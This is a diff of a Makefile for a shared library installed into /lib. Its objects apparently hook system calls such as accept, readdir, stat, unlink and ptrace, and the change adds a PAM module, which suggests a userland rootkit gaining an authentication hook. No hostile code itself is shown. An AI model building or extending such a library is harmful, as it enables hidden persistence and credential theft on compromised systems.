@@ -5,9 +5,9 @@ ODIR=bin
 IDIR=$(SDIR)
 INSTALL=/lib
 CFLAGS+= -Wall -fPIC -shared -D_GNU_SOURCE
-LFLAGS=-ldl
+LFLAGS=-ldl -lpam
 ASMFLAGS+= -f elf64
-_OBJS = accept.o access.o exec.o father.o open.o readdir.o stat.o unlink.o ptrace.o
+_OBJS = accept.o access.o exec.o father.o open.o readdir.o stat.o unlink.o ptrace.o pam.o
 OBJS = $(patsubst %,$(ODIR)/%, $(_OBJS))
 
 all: father fix
